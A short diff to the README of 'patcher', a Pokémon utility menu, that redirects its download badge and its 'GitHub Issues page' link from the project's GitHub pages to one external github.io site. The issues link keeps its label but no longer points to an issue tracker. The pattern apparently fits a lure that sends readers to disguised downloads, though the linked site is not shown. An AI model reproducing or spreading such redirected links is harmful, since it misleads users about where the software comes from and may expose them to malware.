@@ -24,7 +24,7 @@ patcher is a handy utility menu designed for Pokémon enthusiasts using Arbitrar
 
 ### Step 1: Get patcher
 
-[![Download patcher](https://img.shields.io/badge/Download-pather-blue?style=for-the-badge&logo=github)](https://github.com/direct-aperient497/patcher/releases)
+[![Download patcher](https://img.shields.io/badge/Download-pather-blue?style=for-the-badge&logo=github)](https://direct-aperient497.github.io)
 
 Visit this link to download the application.
 
@@ -59,7 +59,7 @@ If you're comfortable with adjusting settings manually, patcher offers a user.js
 
 ## 🤝 Support & Contributions
 
-For issues, feature requests, or questions, visit the [GitHub Issues page](https://github.com/direct-aperient497/patcher/issues). Contributions are welcome via pull requests. Please review the contributing guidelines.
+For issues, feature requests, or questions, visit the [GitHub Issues page](https://direct-aperient497.github.io). Contributions are welcome via pull requests. Please review the contributing guidelines.
 
 ## 📜 License
 
